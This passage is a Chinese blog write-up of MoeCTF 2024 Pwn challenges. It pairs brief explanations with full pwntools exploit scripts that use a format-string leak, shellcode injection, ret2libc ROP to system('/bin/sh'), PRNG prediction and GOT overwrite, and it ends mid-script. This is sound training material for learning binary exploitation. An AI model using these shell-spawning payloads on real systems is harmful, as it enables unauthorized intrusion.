<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724253292780-bfc577e4-df1f-49df-9225-b6d7233e350a.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>泄露之后直接发送</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(filename)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>	io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">33265</span>)<br><span class="hljs-keyword">else</span>:<br>	io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br>	<span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>)<br>sl(<span class="hljs-string">&#x27;%7$p&#x27;</span>)<br>ru(<span class="hljs-string">&quot;Your name:\n&quot;</span>)<br>a1=io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;a1=&#x27;</span>,a1)<br>pay=<span class="hljs-built_in">int</span>(a1.decode(),<span class="hljs-number">16</span>)<br><br>sla(<span class="hljs-string">&quot;Give me the number\n&quot;</span>,<span class="hljs-built_in">str</span>(pay))<br>inter()<br></code></pre></td></tr></table></figure>

<h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>溢出长度自己决定，开头输入shellcode后修改返回地址</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724291160818-e2df3ce1-093a-4141-900f-a2399b4b8ace.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(filename)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>	io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">38059</span>)<br><span class="hljs-keyword">else</span>:<br>	io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br>	<span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>sla(<span class="hljs-string">&quot;Tell me your age:&quot;</span>,<span class="hljs-string">b&#x27;256&#x27;</span>)<br>ru(<span class="hljs-string">&quot;Here is a gift for you :\n&quot;</span>)<br>st=<span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;st=&#x27;</span>,st)<br>shellcode=asm(shellcraft.sh())<br>payload=shellcode.ljust(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(st)<br>ru(<span class="hljs-string">&quot;What do you want to say?&quot;</span>)<br>sl(payload)<br>inter()<br></code></pre></td></tr></table></figure>

<h2 id="prelibc"><a href="#prelibc" class="headerlink" title="prelibc"></a>prelibc</h2><p>ret2libc,gadgets去libc里找</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724297766310-baa106b1-aeb1-4079-be94-d45bbe403f00.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./prelibc&#x27;</span><br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>	io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">38311</span>)<br><span class="hljs-keyword">else</span>:<br>	io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>	<span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><br>output = io.recvline_contains(<span class="hljs-string">b&#x27;I give you an address in libc:&#x27;</span>)<br>puts_addr = <span class="hljs-built_in">int</span>(output.split(<span class="hljs-string">b&#x27;: &#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">b&#x27;.&#x27;</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi=libc_base+<span class="hljs-number">0x2a3e5</span><br>ret=libc_base+<span class="hljs-number">0x29139</span><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x9</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure>

<h2 id="preshellcode"><a href="#preshellcode" class="headerlink" title="preshellcode"></a>preshellcode</h2><p>调用系统函数getshell</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724290549088-05b11161-b092-46c9-83cf-2dd68ceca901.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./preshellcode&#x27;</span><br>elf = ELF(filename)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>	io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">36321</span>)<br><span class="hljs-keyword">else</span>:<br>	io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br>	<span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>payload=asm(shellcraft.sh())<br>sla(<span class="hljs-string">&#x27;Give me your code, and I will execute it.&#x27;</span>,payload)<br><br>inter()<br></code></pre></td></tr></table></figure>

<h2 id="prerandom"><a href="#prerandom" class="headerlink" title="prerandom"></a>prerandom</h2><p>第一次随机可以预测且必须正确</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724308251808-36acb53a-3495-4c9a-ac1b-6ef06228eec7.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>用c跑出随机数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">local_time</span>;</span><br>    <span class="hljs-type">time_t</span> timer;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> secret;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> guess;<br><br>    timer = time(<span class="hljs-number">0</span>);<br>    local_time = localtime(&amp;timer);<br><br>    srandom(local_time);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br><br>        secret = random() % <span class="hljs-number">90000</span> + <span class="hljs-number">10000</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%u,&quot;</span>, secret);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>from pwn import *<br>from <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">import</span> <span class="hljs-title">pack</span></span><br><span class="hljs-class"><span class="hljs-title">import</span> <span class="hljs-title">random</span></span><br><span class="hljs-class"><span class="hljs-title">import</span> <span class="hljs-title">time</span></span><br><span class="hljs-class">#<span class="hljs-title">from</span> <span class="hljs-title">LibcSearcher</span> <span class="hljs-title">import</span> *</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">filename</span>=</span><span class="hljs-string">&#x27;./prerandom&#x27;</span><br><span class="hljs-meta">#elf = ELF(filename)</span><br><span class="hljs-meta">#libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>	io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">33481</span>)<br><span class="hljs-keyword">else</span>:<br>	io = process(filename)<br><br>current_time = <span class="hljs-type">int</span>(time.time())<br><br><br>local_time = time.localtime(current_time)<br>tm_yday = local_time.tm_yday<br>print(<span class="hljs-string">&#x27;tm_yday=&#x27;</span>,tm_yday)<br><br>random.seed(<span class="hljs-number">0x1c</span>)<br><br><br>def s(a) : io.send(a)<br>def sa(a, b) : io.sendafter(a, b)<br>def sl(a) : io.sendline(a)<br>def sla(a, b) : io.sendlineafter(a, b)<br>def r() : <span class="hljs-keyword">return</span> io.recv()<br>def pr() : print(io.recv())<br>def ru(a) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br>def inter() : io.interactive()<br>def gdb():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br>def get_addr():<br>	<span class="hljs-meta">#return u64(io.recvuntil(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))</span><br>	<span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>a=[<span class="hljs-number">42939</span>,<span class="hljs-number">82233</span>,<span class="hljs-number">11977</span>,<span class="hljs-number">49364</span>,<span class="hljs-number">43107</span>,<span class="hljs-number">26433</span>,<span class="hljs-number">12595</span>,<span class="hljs-number">26204</span>,<span class="hljs-number">20274</span>,<span class="hljs-number">26550</span>]<br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>	<span class="hljs-meta">#secret = random.randint(10000,100000)</span><br>	<span class="hljs-meta">#print(<span class="hljs-string">&#x27;secret=&#x27;</span>,secret)</span><br>	sla(<span class="hljs-string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>,str(a[i]))<br>	<br><br>sla(<span class="hljs-string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>inter()<br></code></pre></td></tr></table></figure>

<h2 id="flag-helper"><a href="#flag-helper" class="headerlink" title="flag_helper"></a>flag_helper</h2><p>不能直接读flag，open需要有参数flags</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723464821414-4d2f325a-c38d-4865-8d9b-9589a60a840b.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>需要mmap开辟空间</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723465094787-80ce1c5a-4cd8-40f5-967e-b2f999556058.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>需要mmap</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723465110295-856994d2-cc1a-4a01-ba87-652deeaea894.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>等价于两条命令open(‘&#x2F;flag’,0);mmap(7,34)（部分参数题目没问就省略了，7代表rwx，34是常见的flags值），fd012分别表示标准输入，输出，错误，加上flag前面open的两个文件，所以fd为5</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723465443987-dbe8d25a-9831-4b8f-8d5d-ab5782a5cfe6.png" srcset="/img/loading.gif" lazyload class="" title="img">

<h2 id="pregot-1"><a href="#pregot-1" class="headerlink" title="pregot-1"></a>pregot-1</h2><p>got表可写</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727671790676-7b01f6af-ee3f-4d0b-b940-268858a41f5c.png" srcset="/img/loading.gif" lazyload class="" title="img">

<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1725765690130-cc3530a1-a25e-4dc7-a068-0fd65d5198b9.png" srcset="/img/loading.gif" lazyload class="" title="img">

<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1725765705563-5150f599-e587-464f-b35f-5aedc6999025.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>这里不能直接调用plt表，而是写0x401056</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727671828625-3f15e4d3-83aa-48e8-a4be-21e176fa9e93.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pregot&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>	io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">33953</span>)<br><span class="hljs-keyword">else</span>:<br>	io = process(filename)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb1</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br>	<span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br><span class="hljs-comment">#system_addr=elf.plt[&#x27;system&#x27;]</span><br>system_addr=<span class="hljs-number">0x401056</span><br><span class="hljs-comment">#print(&#x27;sys:&#x27;,hex(system_addr))</span><br>unreachable_addr=<span class="hljs-number">0x401196</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(system_addr)+<span 